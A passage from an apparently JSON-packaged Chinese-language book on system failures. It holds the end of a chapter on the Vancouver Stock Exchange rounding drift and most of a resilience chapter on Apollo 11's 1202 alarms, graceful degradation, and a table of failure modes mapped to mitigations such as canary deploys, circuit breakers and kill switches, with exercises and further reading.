監控為什麼全綠（它在問什麼、漏問什麼，F11）？有沒有一道「獨立對拍」可以早點抓到它、而你當時有沒有那道防線（F3）？它潛伏了多久、是「警報響了」還是「有人起疑」才發現的（F8）？\n\n#### 推演解答\n\n（開放題，自答。）以「某個彙總數字長期偏一邊」為例：觸發是「沒有觸發」，它從某次邏輯改動起就一直單向偏（F8，潛伏期由「沒人對拍」決定）；liveness 全綠，因為那條 job 每天都成功跑完、沒報錯（F11——監控問「job 跑了嗎」、漏問「算對了嗎」）；若當時有「拿獨立來源每天對一次」的 reconciliation job，第一天就抓到，但多數情況下**那道起司根本不存在**（F3）；最後通常不是警報響了，是「有人對另一份報表覺得數字怪怪的」才發現——和 VSE 一模一樣。\n\n對帳的關鍵收穫，通常是那個刺痛的問題：**「從它開始錯到有人發現，隔了多久？這段時間有多少下游決策建立在這個錯的數字上？」** 能把一次靜默問題講成「單向 vs 雙向 / liveness 全綠漏了 correctness / 缺了獨立對拍 / 潛伏多久才靠人起疑」，而不是「就是某個 bug」，這題就過了。\n\n### 推演題4 **[25 分鐘]** ★★（設計題）\n\n挑你一條**關鍵**資料管線（例如那條 CronJob→SQS→冪等消費者的結算 pipeline），它目前的監控幾乎肯定全是 liveness。請設計**兩道 correctness 防線**——一道「對帳型」、一道「不變式型」——讓「數字開始靜默漂走」這件事**會真的叫你**。每道說清楚：檢查什麼、用什麼當獨立真相、多久跑一次、代價是什麼。\n\n#### 推演解答\n\n一個合理的兩道防線：\n\n1. **對帳型（reconciliation）**：每個結算週期結束時跑一個獨立 job，用**和主管線不同的路徑/資料來源**重算一次關鍵總額——例如直接從上游原始成交加總，去對結算 pipeline 算出的總額，差異超過微小閾值就告警。關鍵是「**獨立**」——對帳 job 若重用主管線同一套有 bug 的邏輯，它會跟著錯（這正是 VSE 的教訓：對拍必須用獨立方法，否則同一個 `floor()` 兩邊都漏）。代價：要寫並維護第二套計算、多一份運算、要調校「合理差異 vs 真正偏差」的閾值。但這道直接補上 VSE 缺的那片起司。\n\n2. **不變式型（end-to-end invariant）**：定義一條**恆為真**的性質持續檢查。例如「進入 pipeline 的事件數 = 成功結算數 + DLQ 數 + 明確丟棄數」（守恆，沒有事件被靜默吞掉）、或「所有帳戶餘額變動加總 = 這批交易的淨額」，違反就告警，捕捉「漏算/重複算/靜默吞掉」這類單向漂移的根源。代價：要想清楚「什麼性質恆為真」（比寫對帳難、要對 domain 有深刻理解）、寫錯會給你假警報。但一條對的不變式，是把「資料對不對」變成一個**可被自動檢查的 safety property**（概念上你書架的 TLA+ 書講的就是這個，這裡不展開）——它就是那個會在 VSE 第一個月就把你叫醒的警報。\n\n排序與精神：兩道分別擋「和獨立真相對不上」與「內部守恆被破壞」。對帳是外部交叉驗證、不變式是內部一致性檢查，兩者正交、互補。它們的共通核心，是把你的監控從「**服務還活著嗎**」擴張到「**資料還對嗎**」——這正是焦慮工程師面對靜默失敗的唯一武器：你阻止不了資料偶爾出錯，但你可以讓它**出錯的時候你會知道**，而不是 22 個月後靠人起疑（接 ch22 把這套「安全地壞」系統化）。\n\n## 自我檢核\n\n口頭自答，講得出來才算過關：\n\n1. 為什麼說 VSE 的關鍵**不是**「四捨五入的小誤差」？把它講對的那句話是什麼（提示：方向性 + 高頻 + 累積）？如果一開始用的是 `round()`，這個 bug 會不會釀災，為什麼？\n2. 為什麼說「市場崩了一半」是錯的？真正壞掉的是什麼、沒壞的是什麼？「壞的是你對世界的量測，不是世界」這句話在這裡具體指什麼？\n3. 為什麼這個 bug 能潛伏約 22 個月而沒有任何警報響？那套監控**在問什麼**、**漏問了什麼**？liveness 和 correctness 為什麼是正交的兩個維度、而不是同一維度的粗細？\n4. 這一章的「觸發」是什麼？為什麼用 ch02（見 ch02）那種「往回找根因、找觸發時刻」的方法在 VSE 身上會撲空？F8 在這裡被推到了什麼極端？\n5. 把 VSE 接到 ch16 三哩島（見 ch16）：兩者都是「觀測性的謊言」——三哩島的燈顯示**意圖**而非**現實**，VSE 的監控顯示**有沒有**而非**對不對**。為什麼說它們是孿生兄弟？\n6. 把 VSE 接到 ch08 Schiaparelli（見 ch08）：兩者都是「一個壞數字、沒有合理性檢查」，但一個瞬間墜毀、一個默默漂移 22 個月。是什麼讓它們走向完全不同的災難形狀（提示：緊耦合直通 vs 鬆散累積）？\n7. split-brain 為什麼是 VSE 形狀「爆炸半徑最大」的變體？為什麼兩個叢集的 liveness 可以都全綠、狀態卻在分岔？quorum + fencing 怎麼從結構上擋住它？\n8. 在你的系統裡，「監控全綠 = 資料正確」這假設藏在哪幾個具體地方（單向漂移計數器、副本不收斂、快取髒值、結算總額）？你有沒有**任何一道** correctness 防線（對帳/checksum/不變式）？如果完全沒有，你和 1983 年的 VSE 差在哪？\n\n## 延伸閱讀\n\n- **Technical University of Munich（Huckle）案例頁**：*The Vancouver Stock Exchange*。<https://www5.in.tum.de/~huckle/Vancouv.pdf> — 數值計算課程整理的權威案例頁，把「truncation vs rounding、一天約 2,800–3,000 次重算、22 個月累積到真值一半」講得最清楚的一份，並列出原始來源。\n- **B. D. McCullough 等對數值正確性的討論**：學術文獻常引 VSE 作為「軟體數值誤差能造成重大實務後果」的標準案例（如 McCullough & Vinod 對統計/財務軟體數值可靠性的系列討論）。想理解「為什麼數值正確性值得被當成一等公民去驗證」，這條譜系是源頭。\n- **Wikipedia: Vancouver Stock Exchange**（rounding error 段）：<https://en.wikipedia.org/wiki/Vancouver_Stock_Exchange> — 對 1000→（漂移）→1098.892 重開盤這條時間線的簡明整理。一個小提醒：不同來源對「修正前的收盤值」有 524.881（學術／McCullough 譜系，本章採用）與 524.811（Wikipedia 譜系）兩種寫法，差在第三位小數的一個轉位；但「漂到約真值一半、修正後一夜翻倍」這個核心事實多源一致。\n- **延伸到你自己的世界**：任何一篇講 **silent data corruption / bit rot**、**split-brain 與 quorum/fencing**、或 **reconciliation（對帳）模式**的工程文章，都是這一章在你後端世界的直接延伸——VSE 是 1983 年的 silent data corruption，而你每天維運的最終一致系統，是它的現代棲地。把這一章讀成「我該替哪條管線加一道對帳/不變式」，比讀成「一個古老的小數點故事」有用得多。\n"}, {"id": "ch22-resilience", "file": "ch22-resilience.md", "group": "Part VII — 怎麼安全地壞", "title": "ch22 — 韌性工程：阿波羅 11 號著陸時，電腦過載了——然後它活了下來", "md": "# ch22 — 韌性工程：阿波羅 11 號著陸時，電腦過載了——然後它活了下來\n\n> **本章解剖什麼**：這是全書唯一一個「險些釀災、但靠設計化解」的正面案例——1969 年阿波羅 11 號登月下降時，導引電腦因雷達偷走 CPU 而過載、連跳 1201/1202 警報，卻沒當機、沒中止任務，反而依設計丟掉低優先工作、保住關鍵導引，穩穩落地。本章把全書前二十章的每一場崩潰翻過來：每個 F1–F14 失敗模式，配一道緩解手段。這是全書從「怕」翻成「怎麼蓋」的轉折章（Part VII 開場）；終章（見 ch23）把這套清單組裝成可操作的判斷力。對照組是 Schiaparelli（見 ch08）：同樣是「異常輸入」，差別只在系統選擇優雅降級，還是緊耦合直通崩潰。\n\n```\nPart I 框架與前傳          Part II 安全系統即兇手     Part III 一個數字一場崩塌\nch01 正常意外(序)          ch04 737 MAX / MCAS       ch07 金姆利滑翔機\nch02 解剖的工具       →    ch05 法航 447         →   ch08 Schiaparelli\nch03 機器之前的崩壞        ch06 于伯林根相撞          ch09 Sleipner A 平台\n                                                          │\n                                                          ▼\nPart VII 怎麼安全地壞      Part VI 看不見的縫        Part IV 連鎖反應\nch22 韌性工程 ◄你在這裡 ← ch18 Morris 蠕蟲     ←    ch10 Cloudflare regex\nch23 正常意外與你(收)      ch19 Heartbleed           ch11 2010 閃電崩盤\n                          ch20 供應鏈即災難          ch12 德州電網 2021\n                          ch21 靜默的錯誤            ch13 雲端連鎖\n                                  ▲                        │\n                                  │                        │\n                  Part V 漂移到失效 ◄──────────────────────┘\n                  ch14 挑戰者 → ch15 哥倫比亞 → ch16 三哩島 → ch17 車諾比\n```\n\n## 從你已知的出發\n\n你寫過一個全團隊都在用的多層 cache library：先查 in-memory，沒命中退到 S3，再退到 local，每一層都帶 graceful degradation。我要你先記住一件事——**那個東西本身就是這一章的主角之一**。你不是在讀一個與你無關的太空故事，你是在讀「你已經在做的事，三十年前在月球上空怎麼救了三條命」。\n\n想想你那套 cache 真正在做什麼。當 in-memory 層失效，你的系統沒有「全有或全無」地崩掉——它退到下一層，吞下延遲，繼續服務。使用者也許慢了幾百毫秒，但他拿到了結果。這就是 graceful degradation 的本質：**壞掉的時候，不是停止服務，是降低服務**。你心裡有一條優先順序——「拿到資料」比「拿得快」重要，所以你寧可慢、不要斷。\n\n現在把這條原則放大到一台 1969 年、記憶體以「字」計、時脈以 KHz 計的電腦上。它在月球上空一萬呎、燃料只夠再撐幾十秒、太空人的命壓在它身上的那一刻，做了和你的 cache library 同一件事：**過載了，就丟掉不重要的，保住要命的**。\n\n這一章我會把你已經在做的事，放進一條從阿波羅到今天的譜系裡；然後誠實地告訴你，你還缺哪幾道防線（kill switch、混沌演練、依賴多樣性、canary）——因為焦慮工程師的信條不是「我有 graceful degradation 所以沒事」，而是「我有一道，但另外五道孔洞還開著」。\n\n## 冷開場：1969-07-20，月球上空，\"PROGRAM ALARM\"\n\n登月小艇 Eagle 進入動力下降（powered descent）約五分鐘。Armstrong 與 Aldrin 站在那台叫 Apollo Guidance Computer（AGC）的電腦前——它是人類第一台投入實戰的數位飛控電腦，由 MIT Instrumentation Laboratory 設計，記憶體小到今天一張賀卡的晶片都看不上眼。\n\n然後 Armstrong 的聲音傳回休士頓：「Program alarm.」接著:「It's a 1202.」\n\n地面控制室瞬間繃緊。1202 是什麼？沒人——包括正在下降的太空人——當下完全清楚。再幾秒，又一次。整個下降過程，AGC 一共跳出四次程式警報（三次 1202、一次 1201，照 landscape；部分史料記為五次⚠️）。每一次都像在問同一個問題：**要不要中止登月？**\n\n中止登月（abort）意味著點燃上升引擎、拋掉下降段、放棄這次著陸——耗費了一個國家十年與數十億美元、全世界都在看的這一刻，可能因為一台電腦喊「我有狀況」而作廢。\n\n但他們沒有中止。28 歲（一說 24 歲）的導引官 Steve Bales，與在他身後、口袋裡揣著一張小抄的 24 歲工程師 Jack Garman，在數秒內判定：**只要警報不是連續刷屏、導引資料仍然正常，就 GO。** Bales 回報那句後來進了歷史的話：「We're GO on that alarm.」\n\nEagle 繼續下降。1969-07-20，人類第一次踏上月球。\n\n這裡是全書最重要的反轉：**1202 不是電腦壞了**。\n\n## 裝填：AGC 為什麼會過載\n\n要看懂這個正面案例，得先看清楚它「險」在哪——因為它的險，和前面二十章的災難長得一模一樣。\n\n潛伏條件早就裝填好了。AGC 在動力下降階段本來就逼近運算負載上限——這是一台用盡了每一個週期的電腦，沒有多少餘裕。觸發是一個介面設定問題：Aldrin 把會合雷達（rendezvous radar）的開關放在某個位置，本意是「萬一要中止登月，好快速重新捕捉指揮艙」——一個完全合理的謹慎之舉。但會合雷達與 AGC 的電源相位不同步，使雷達不斷向 AGC 索取它根本不需要的計數週期，這叫 cycle steal（週期竊取）。它憑空吃掉約 13% 的 CPU 時間。\n\n一台本就接近滿載的電腦，再被偷走 13%，就溢位了。AGC 在每個週期內排不下所有該做的工作，於是丟出警報：1202 是 \"Executive overflow — no core sets\"，1201 是 \"Executive overflow — no VAC areas\"——白話說，「我超載了，沒有可用的工作儲存區了」。\n\n停在這裡，你看到的是一場標準的正常意外（見 ch01）的裝填：一個緊耦合的系統（F1）、一個沒人預期的子系統交互（會合雷達與導引電腦共享 CPU，F2）、一個合理操作意外觸發的潛伏條件（F8）。如果 AGC 是用前面二十章那些災難的設計哲學寫的，接下來就是熟悉的劇本——它會當機、會鎖死、會在最糟的時刻把一架好太空船丟回給來不及反應的人（這正是法航 447，見 ch05）。\n\n但它沒有。這才是本章的全部重點。\n\n## 為什麼它活了下來：優先權排程 + 重啟丟負載\n\nAGC 的作業系統不是按固定時序跑死板排程的。它的 executive 由 Hal Laning 設計成**優先權導向、事件驅動的非同步排程器**——每個工作（job）帶一個優先權。下降導引、引擎控制、與太空人溝通的 DSKY 顯示，是最高優先；那些被雷達塞進來的雜務，是低優先。\n\n關鍵在於：當 AGC 偵測到過載——它要不到 core set、要不到 VAC area——它**不會當機，也不會鎖死**。它做了一件當時極為前衛、今天我們叫 graceful degradation 的事：執行「軟重啟（software restart）」。重啟時，它丟棄低優先權、可重啟的工作，只重新排程並保住最高優先權的關鍵工作。MIT 的工程師 Don Eyles（寫了下降導引軟體的人）後來把這套機制叫 \"restart protection\"，形容它像「打進去一通假的炸彈威脅電話」——疏散非必要的人、保住核心。\n\n於是每次 1201/1202 之後，AGC 都在毫秒級內重啟、繼續穩穩執行登月導引。被丟掉的是低優先的雷達雜務，導引、引擎、顯示**毫髮無傷**。太空人甚至沒有感覺到下降中斷過——對他們而言，數字一直在更新，飛行一直在繼續。\n\n這就是優雅降級的精確定義，請你把它刻進腦子，因為它是全書收官的鑰匙：\n\n> **韌性不是「不會壞」，是「壞的時候，主動犧牲非必要的，保住核心的」——而不是全有或全無地崩潰。**\n\n再把它和你的 cache library 並排看：你的 in-memory 層「壞了」（cache miss），系統不崩，退到 S3，吞延遲、保結果。AGC 的低優先工作「排不下了」，系統不崩，丟掉雜務、保導引。**這是同一個形狀**。你每天在做的工程決策，和救了阿波羅 11 號的，是同一條原則。\n\n還有一條同樣重要、但常被浪漫敘事蓋掉的線：**人的準備**。Garman 那張小抄不是運氣，是事前把「每一種程式警報代表什麼、哪些可以忽略」整理好的結果。Bales 與 Garman 能在數秒內判讀「這個警報不致命」，靠的是準備，不是英雄式的臨場直覺。這對你意味著：**你的 runbook、你的告警分級、你 oncall 時手邊那份「這個 alarm 響了該怎麼判斷」的文件——就是 Garman 的小抄**。系統的優雅降級若沒有人的「我知道這個降級是預期內的」配套，照樣會有人在恐慌中按下中止鍵。\n\n## 對照組：為什麼 Apollo 活了，Schiaparelli 死了\n\n把阿波羅 11 號和 Schiaparelli 火星著陸器（見 ch08）並排，是全書最乾淨的一組對照——因為它們的觸發幾乎一樣，結局卻完全相反。\n\n| | 阿波羅 11 號（1969） | Schiaparelli（2016） |\n|---|---|---|\n| 異常 | 雷達偷 CPU、執行緒過載 | IMU 飽和、產生壞的姿態資料 |\n| 壞數值 | 「排不下所有工作」 | 積分出「負高度」（物理上不可能） |\n| 系統反應 | 偵測過載→軟重啟→丟低優先、保導引 | 壞數值直通決策→誤判已著陸→提前關推進器 |\n| 有沒有合理性檢查 | 有：過載被當成「該降級」的訊號 | 沒有：「負高度」沒被任何一層擋下 |\n| 緊耦合？ | 否：過載與「中止任務」之間有緩衝（降級層） | 是：壞數字直通推進器關閉，無緩衝 |\n| 結局 | 成功著陸 | 自 3.7 km 高空墜毀、約 540 km/h 撞地 |\n\n差別不在「誰的硬體比較好」。差別在**設計哲學**：\n\n- Schiaparelli 信任了一個它不該信任的數值，把它直接餵給最終決策（F10 過度信任單一估計、F1 緊耦合直通）。一個飽和的感測器產生一個荒謬的數字（負高度），沒有任何一層問一句「這合理嗎？高度不可能是負的」，就觸發了關掉推進器。\n- 阿波羅把過載當成一個**預期內、可降級的狀態**，而不是一個必須崩潰的錯誤。它的設計者假設「總有一天會過載」，並且為那一天寫好了優雅的反應。\n\n這是焦慮工程師與樂觀工程師的分水嶺。樂觀工程師假設輸入是好的、負載在預期內、依賴會在。焦慮工程師假設輸入會是壞的、負載會爆、依賴會掛——然後為那一天**設計好降級路徑**。阿波羅的設計者是焦慮工程師。Schiaparelli 的某一層不是。\n\n## 故障解剖：把 F1–F14 翻成緩解手段\n\n本章的招牌不是解剖一場災難，而是**把全書累積的失敗模式語言整個翻過來**——每一個 F 模式，配一道緩解手段，並指出前面哪一章正是因為缺了它而崩。這就是 ch23 總目錄的骨架。\n\n先反向解剖阿波羅 11 號這個正面案例——它「對在哪」：\n\n- **潛伏條件 vs 觸發**：潛伏是「AGC 接近滿載、無多少餘裕」；觸發是「雷達 cycle steal 偷 13% CPU」。和前二十章一模一樣的裝填。差別在第三格——**系統對觸發的反應**：阿波羅選了降級，不是崩潰。\n- **本可崩潰、卻沒崩的每一道設計**（把瑞士起司倒過來看——這次每一層都擋住了）：\n\n| 防線 | 阿波羅怎麼做對 | 哪一章缺了它而崩 |\n|---|---|---|\n| 過載偵測 | AGC 主動偵測「要不到 core set」 | Morris 蠕蟲再感染失控前無過載煞車（見 ch18） |\n| 優先權排程 | 關鍵工作有保證的優先權 | 2010 閃電崩盤（見 ch11）無價格/時間護欄，代理互相踩踏 |\n| 重啟丟負載 | 軟重啟丟低優先、保核心 | Schiaparelli（見 ch08）壞數值直通、無降級 |\n| 合理性把關 | 過載被當訊號、非致命錯誤 | Schiaparelli 對「負高度」無 sanity check |\n| 人的準備 | Garman 小抄、Bales 快速判讀 | 三哩島（見 ch16）操作員被指示燈騙、無法判讀真實狀態 |\n\n下面是全書的核心商品——**F1–F14 反面解方對照表**。讀法：左邊是失敗模式，中間是緩解手段，右邊是「前面哪一章因為缺它而崩」。\n\n| F | 失敗模式 | 緩解手段 | 缺它而崩的案例 |\n|---|---|---|---|\n| F1 | 緊耦合 | **解耦＋緩衝（buffer/queue）、bulkhead 艙壁隔離** | Schiaparelli 壞數字直通推進器（見 ch08） |\n| F2 | 互動複雜度 | **降低耦合面、明確契約、依賴圖盤點、混沌演練逼出非預期交互** | 車諾比正空泡係數的正回授（見 ch17）、雷達偷 CPU |\n| F3 | 起司孔洞對齊 | **多層獨立防禦＋孔洞錯開（不要同因）、定期演練每一層** | 挑戰者雙 O-ring 同因失效（見 ch14） |\n| F4 | 安全系統即危險源 | **失效要 fail-safe，不要 fail-deadly；保護機制本身要有「最壞情況下行為」的審查** | 車諾比 AZ-5 反而引爆（見 ch17）；阿波羅是反例——重啟保護真的保護了 |\n| F5 | 自動化的諷刺 | **保留人的手動接管肌肉記憶、定期演練、清楚的狀況顯示** | 法航 447 自動化在最糟時刻丟回給機組（見 ch05） |\n| F6 | 偏差正常化／漂移 | **重新檢視被正常化的告警、把「暫時」設過期日、定期挑戰「為什麼這還沒爆」** | 挑戰者 O-ring 侵蝕被逐步接受（見 ch14）、德州電網防寒（見 ch12） |\n| F7 | 級聯／雪崩 | **circuit breaker 熔斷、backpressure 反壓、rate limit、隨機抖動打斷正回授** | 2010 閃電崩盤 hot-potato（見 ch11）、Morris 蠕蟲再感染（見 ch18） |\n| F8 | 潛伏條件 vs 觸發 | **廢碼清除（dead code）、定期完整重啟驗證、把潛伏假設寫成測試** | 金姆利停飛前 FQIS 已失效的潛伏（見 ch07）、Heartbleed 潛伏兩年（見 ch19） |\n| F9 | 介面與假設的縫 | **帶單位的型別、contract test、端到端驗證、sanity check 合理性閘門** | 金姆利磅當公斤（見 ch07）、Schiaparelli 負高度（見 ch08） |\n| F10 | 單一故障點／單一感測器 | **冗餘的「多樣性」（diverse redundancy）、交叉驗證、多數決** | 737 MAX 單一 AoA 感測器（見 ch04） |\n| F11 | 監控盲區 | **看實際狀態而非意圖、告警分級、告警不可被淹沒、儀表反映現實** | 三哩島指示燈顯示「指令」非「閥位」（見 ch16） |\n| F12 | 變更即觸發 | **canary／分批滾動部署、自動 rollback、kill switch、變更複核** | Cloudflare regex 一次推全球（見 ch10）、CrowdStrike 無灰度（見 ch13） |\n| F13 | 生產壓力壓過安全 | **明確的「停下來查」授權、blameless 文化、不以進度凌駕 gate** | 挑戰者發射前夜電話會議（見 ch14）、車諾比為完成測試停用保護（見 ch17） |\n| F14 | 規模放大／單一栽培 | **依賴多樣性、分批 blast radius 控制、避免全域同步推送、隔離爆炸半徑** | CrowdStrike 850 萬台同時藍屏（見 ch13）、Morris 蠕蟲打通 Unix 同質生態（見 ch18） |\n\n注意 F3、F10、F14 共用一個你必須吃透的概念，因為它是全書最反直覺的一道：**冗餘的「多樣性」**。\n\n想想挑戰者號的雙 O-ring（見 ch14）:主環、副環是同一種橡膠、同一個接頭、暴露在同一個低溫下——讓主環失效的機制一字不差地也讓副環失效。兩道防線不是獨立的,是同一個失效模式的兩份副本,被同一顆子彈(低溫)同時打中。**複製一份有 bug 的東西,不叫冗餘,叫把同一個 bug 部署兩次。**\n\n這也是 Cloudflare（見 ch10）與 CrowdStrike（見 ch13）的形狀：全球同步推送同一份內容，等於把同一顆炸彈同時投到每個節點——你有一萬台機器，但它們是一萬份相同的 bug。真正的冗餘要有**多樣性**：不同實作、不同版本、不同供應商、不同部署批次——這樣同一個觸發才不會同時打穿所有副本。阿波羅的優先權排程之所以有效，部分正是因為它沒有把「所有工作」當成同質的一坨，而是分了優先級、可以選擇性丟棄。\n\n**這場「災難」的形狀是（反過來說）：一個緊耦合、互動複雜、本會過載的系統，因為設計者預設了「總會過載的那一天」並寫好了優雅降級——過載被當成可降級的訊號而非致命錯誤，於是孔洞沒有對齊，意外沒有變成災難。**\n\n## 換成你的系統\n\n現在把這套清單對準你自己的系統，點名你「應該沒事吧」的假設。\n\n你有 graceful degradation（cache library），這是你的強項。但焦慮工程師不會停在強項上。我替你把最可能開著的孔洞列出來：\n\n**假設一：「我的降級路徑會在真出事時生效。」** 你的 cache library 退到 S3 那條路，上一次真正在生產跑過是什麼時候？還是只在你寫它的時候測過一次？降級路徑是所有程式碼裡最少被執行、因此最可能悄悄壞掉的——它是你的「備用降落傘」，而備用降落傘最怕的就是「從沒在真實墜落中打開過」。這就是 chaos engineering（混沌工程）要解決的：**主動在生產（或近生產）注入故障，逼你的降級路徑真的跑一次**，趁你還醒著、還在看的時候，而不是凌晨三點 oncall 時。你做過嗎？\n\n**假設二：「我的部署不會一次打中所有人。」** 你的服務跑在 ECS/Lambda 上，你會做藍綠/滾動部署——但那是不是 canary（金絲雀）？滾動部署只是「慢慢全換」，canary 是「先換 1%，盯著錯誤率，不對就自動 rollback，對才繼續」。Cloudflare 和 CrowdStrike 的差別不在它們不會滾動，而在它們把一份壞東西一次推給全世界、中間沒有一個「先放 1% 看看」的閘門。你的設定變更、feature flag 切換、規則更新，有沒有 canary？\n\n**假設三：「真出事我來得及手動止血。」** 你有 kill switch 嗎——一個能在 30 秒內把某個失控功能、某條熱路徑、某個正在自我放大的迴圈整個關掉的開關？Cloudflare 那次靠全球 kill switch 關掉 WAF 才止住血（見 ch10）。2010 年閃電崩盤當時欠缺單一個股熔斷,自動賣壓正回授幾分鐘內蒸發近兆美元（見 ch11）。你那個自動 retry、自動 scaling、自動 failover——當它開始正回授、把系統往下推的時候（這是 retry storm/thundering herd 的形狀），你有沒有一個不需要重新部署、就能立刻掐斷它的開關？\n\n**假設四：「我的冗餘是真的冗餘。」** 你的兩個 replica、兩個 region、兩條路徑——它們是不是跑同一份 image、同一個 bug、依賴同一個上游？挑戰者的雙 O-ring（見 ch14）教你的是：相同的副本對相同的觸發無效。你的「高可用」有沒有可能只是「把同一個 SPOF 部署了兩次」？\n\n一個可操作的自問，給你帶走：**列出你系統裡每一個「自動採取激烈動作」的機制（autoscaling、failover、retry、circuit breaker、自動清理），問每一個：當它的輸入訊號是錯的時候，它會把系統推下懸崖，還是優雅降級？它有沒有 kill switch？** 這正是 737 MAX（見 ch04）的問題——MCAS 是一個「依賴單一錯誤輸入就採取激烈動作、且沒有 kill switch、飛行員還不知道它存在」的自動化。你的系統裡有幾個 MCAS？\n\n## 紙上推演\n\n### 推演題1 **[15 分鐘]** ★\n\n口頭（對另一個工程師）講清楚：為什麼阿波羅 11 號的過載沒有釀災，而 Schiaparelli 的壞數字釀了災？要點名「優雅降級」與「合理性檢查」這兩個機制，並說明兩者觸發何其相似、結局何其相反。\n\n#### 推演解答\n\n兩者的觸發幾乎同構：都是一個子系統產生了系統「沒預期、超出正常範圍」的狀態——阿波羅是執行緒過載（排不下工作），Schiaparelli 是 IMU 飽和（產生負高度）。差別只在系統怎麼接這個異常：\n\n- 阿波羅把「過載」當成一個**預期內、可降級的訊號**。它的 executive 偵測到要不到 core set，執行軟重啟，丟棄低優先工作、保住導引——過載與「任務失敗」之間有一層緩衝（降級機制）。\n- Schiaparelli 把「負高度」當成**真值**直接餵給最終決策，沒有任何一層問「高度不可能是負的」。壞數值與「關掉推進器」之間**沒有緩衝**（F1 緊耦合 + F10 過度信任單一估計 + F9 缺合理性閘門）。\n\n所以一句話總結：差別不在硬體、不在運氣，在**設計者有沒有為「總會出現的異常」預先寫好優雅的反應**。阿波羅的設計者假設「它總有一天會過載」並為那天設計；Schiaparelli 的某一層假設「IMU 給的數字都是對的」。前者是焦慮工程師，後者不是。把這條接回你的 cache library：cache miss 是你「預期內、可降級的訊號」，你退到下一層——你做的就是阿波羅做的事。\n\n### 推演題2 **[25 分鐘]** ★★\n\n拿你維運的一個真實系統，逐一對照本章的「安全地壞」清單。重點找三種洞：（a）哪裡是「全有或全無」、缺降級路徑；（b）哪裡缺 kill switch；（c）哪裡的冗餘其實只是同一份 bug 的副本（缺多樣性）。每一條寫下「它在什麼輸入/負載下會崩，以及崩成什麼樣」。\n\n#### 推演解答\n\n沒有標準答案，但合格的盤點要對每一條給出**具體的失敗劇本**，不能只寫「可能會有問題」。示範三條（以你的技術棧為例）：\n\n- **(a) 全有或全無**：「結算 pipeline 的 idempotent consumer 若下游 RDS 不可用，目前會整批 retry 直到 SQS 訊息過期進 DLQ——沒有降級路徑（如先寫入暫存、稍後補算）。輸入：RDS 故障 10 分鐘。崩法：訊息堆積、DLQ 爆量、結算延遲，且 retry 本身加重 RDS 負載（正回授）。」\n- **(b) 缺 kill switch**：「自建 Lambda decorator 框架的自動 retry，沒有一個全域開關能在不重新部署的情況下關掉某個正在 retry storm 的端點。輸入：某下游持續 5xx。崩法：retry 放大成 thundering herd，把下游與自己一起打趴，而我只能等重新部署生效。」\n- **(c) 假冗餘**：「兩個 ECS task 跑同一份 image。輸入：image 裡有個會在特定 payload 下 OOM 的 bug。崩法：同一個 payload 打到哪個 task 都 OOM，兩個副本不提供任何獨立性——這是『把同一個 bug 部署兩次』的形狀（見 ch14 雙 O-ring 共因失效）。」\n\n評分標準：你有沒有對每條寫出「哪個輸入/負載 + 崩成什麼樣」。寫不出具體劇本的那一條，就是你還沒真正想清楚的孔洞。\n\n### 推演題3 **[20 分鐘]** ★★★\n\n設計題：給你一個現有的、目前「全有或全無」的關鍵系統（自選），你只能加三道防線。你會加哪三道、各擋住哪個 F 模式、各自的代價（複雜度/延遲/成本）是什麼？論證為什麼是這三道而非別的。\n\n#### 推演解答\n\n合格答案要展現**取捨意識**——韌性不是免費的，每加一道防線都有代價，焦慮工程師要能說清楚「我為什麼先加這三道」。一個示範論證（以結算 pipeline 為例）：\n\n1. **graceful degradation 降級路徑（擋 F1 緊耦合）**：RDS 不可用時，先寫入暫存佇列、稍後補算，而非整批失敗。代價：增加一條程式碼路徑與最終一致性窗口、要處理補算的冪等。為什麼第一：它把「全有或全無」變成「降級服務」，性價比最高——直接消除最致命的崩法。\n2. **circuit breaker（擋 F7 級聯）**：下游連續失敗時跳開、停止 retry、快速失敗，避免 retry storm 正回授。代價：要調 threshold、half-open 探測；調太敏感會誤跳。為什麼第二：它防止「故障被自己放大」，且與第一道互補（熔斷後走降級路徑）。\n3. **kill switch（擋 F12 變更即觸發 / 給人最後的手）**：一個不需重新部署、能立刻關掉某功能的開關（feature flag 已有，補上「緊急關閉」語意與演練）。代價：要維護開關狀態、避免它自己變成 SPOF。為什麼第三：當前兩道自動機制也誤判時，它是人的最後一道手動止血——Garman 的小抄與 Bales 的判讀的工程化。\n\n關鍵在論證「為什麼這個順序」：先消除最致命的崩法（全有或全無），再防止放大（級聯），最後保留人的接管能力（kill switch）。三道彼此互補、覆蓋不同 F 模式，而不是三道都在防同一件事。\n\n## 自我檢核\n\n1. 用一句話說出「韌性」在本書的定義——它**不是**什麼，**是**什麼？\n2. 1202/1201 警報到底是什麼意思？AGC 過載時做了什麼，使它沒有當機？（要講出「優先權排程」與「重啟丟低優先工作」兩個機制。）\n3. 為什麼說「1202 是電腦壞了/bug」是錯的？根因（雷達 cycle steal）是哪一類問題——軟體缺陷，還是介面/程序設定？\n4. 阿波羅 11 號與 Schiaparelli（見 ch08）的觸發何其相似、結局何其相反——差別的那一格是什麼？\n5. 為什麼「複製一份有 bug 的東西兩次」不叫冗餘？挑戰者的雙 O-ring（見 ch14）為什麼會一起失效?用「冗餘的多樣性」回答。\n6. canary（金絲雀部署）和單純的滾動部署差在哪？它擋住的是 Cloudflare（見 ch10）與 CrowdStrike（見 ch13）的哪一個失敗模式？\n7. 你自己系統裡，哪一個「自動採取激烈動作」的機制最像 737 MAX 的 MCAS（見 ch04）——依賴可能錯的輸入、採取激烈動作、且沒有 kill switch？\n8. Garman 的「小抄」對應到你維運世界裡的什麼？為什麼「系統會優雅降級」還不夠、還需要人的這一份東西？\n\n## 延伸閱讀\n\n- **NASA Apollo 11 Lunar Surface Journal — Program Alarms 專頁**（https://www.hq.nasa.gov/alsj/a11/a11.1201-pa.html）：含 Bales、Garman、Hamilton 的第一手回憶與技術說明，是 1201/1202 事件的一級史料。要看「過載被優雅化解」的原始現場，從這裡開始。\n- **Don Eyles, \"Tales from the Lunar Module Guidance Computer\"（2004，AAS Guidance & Control Conference）**（https://klabs.org/history/apollo_11_alarms/eyles_2004/eyles_2004.htm）：寫下降導引軟體的人親自解釋 cycle steal、restart protection 與優先權排程怎麼救了登月。工程師對工程師的第一手敘述。\n- **David A. Mindell,《Digital Apollo: Human and Machine in Spaceflight》（MIT Press, 2008）**：把阿波羅飛控放進「人與自動化如何分工」的脈絡——正好是法航 447（見 ch05）與于伯林根（見 ch06）那條自動化諷刺線的正面對照。\n- **Sidney Dekker,《Drift into Failure》**：本書「漂移到失效」的源頭（見 ch02、ch14）；讀完阿波羅的優雅降級，再回頭看「韌性是設計出來的、不是運氣」這個論點的理論底座。\n- **ESA Schiaparelli 